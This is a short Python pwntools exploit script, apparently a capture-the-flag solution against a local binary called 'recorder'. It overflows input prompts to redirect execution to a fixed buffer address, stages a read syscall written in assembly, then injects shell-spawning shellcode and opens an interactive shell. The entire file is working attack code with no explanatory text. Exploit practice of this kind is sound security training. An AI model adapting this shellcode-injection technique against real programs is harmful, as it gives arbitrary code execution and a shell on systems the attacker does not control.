#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

p = process('./recorder')
# pause()

message = 0x601060

payload = flat(
    cyclic(0x4)
)

p.sendafter('?', payload)

payload = flat(
    asm('''
    mov rsi, 0x60106c
    xor rdi, rdi
    syscall
    '''),
    cyclic(0xc),
    message
)

p.sendlineafter('?', payload)

payload = flat(
    asm(shellcraft.sh())
)

p.sendafter('\n', payload)

p.interactive()
p.close()
